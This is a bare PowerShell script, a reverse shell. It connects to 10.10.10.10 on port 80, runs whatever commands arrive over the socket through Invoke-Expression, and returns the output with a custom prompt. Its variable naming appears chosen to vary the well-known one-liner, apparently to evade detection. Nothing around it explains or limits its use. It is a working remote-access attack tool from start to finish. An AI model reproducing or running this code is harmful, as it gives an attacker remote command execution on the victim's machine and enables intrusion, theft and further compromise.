$ip="10.10.10.10";
$port=80;
$client = New-Object System.Net.Sockets.TCPClient($ip,$port);
$stream = $client.GetStream();
$number = 65535;
$zero =0;
[byte[]]$bytes = $zero..$number|%{$zero};
while(($i = $stream.Read($bytes, $zero, $bytes.Length)) -ne $zero){;
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,$zero, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2  = $sendback + "RP " + "# ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,$zero,$sendbyte.Length);
$stream.Flush()};$client.Close()
